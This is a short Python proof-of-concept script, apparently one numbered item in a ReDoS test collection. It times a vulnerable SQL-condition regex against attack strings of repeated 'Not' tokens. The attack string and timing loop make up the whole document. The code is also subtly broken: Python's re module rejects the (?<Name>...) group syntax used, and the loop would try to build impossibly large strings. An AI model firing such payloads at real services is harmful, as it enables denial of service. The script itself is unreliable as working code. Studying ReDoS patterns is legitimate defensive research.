# 1340
# ((?<Owner>\[?[\w\d]+\]?)\.{1})?(?<Column>\[?[\w\d]+\]?)(\s*(([><=]{1,2})|(Not|In\(|Between){1,2})\s*)(?<Value>[\w\d\']+)
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:"1Not"+"Not"*5000+"!1 _◎@! _1!\n_SLQ_3"

import re
from time import perf_counter

regex = """((?<Owner>\[?[\w\d]+\]?)\.{1})?(?<Column>\[?[\w\d]+\]?)(\s*(([><=]{1,2})|(Not|In\(|Between){1,2})\s*)(?<Value>[\w\d\']+)"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "1Not" + "Not" * i * 10000 + "!1 _◎@! _1!\n_SLQ_3"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")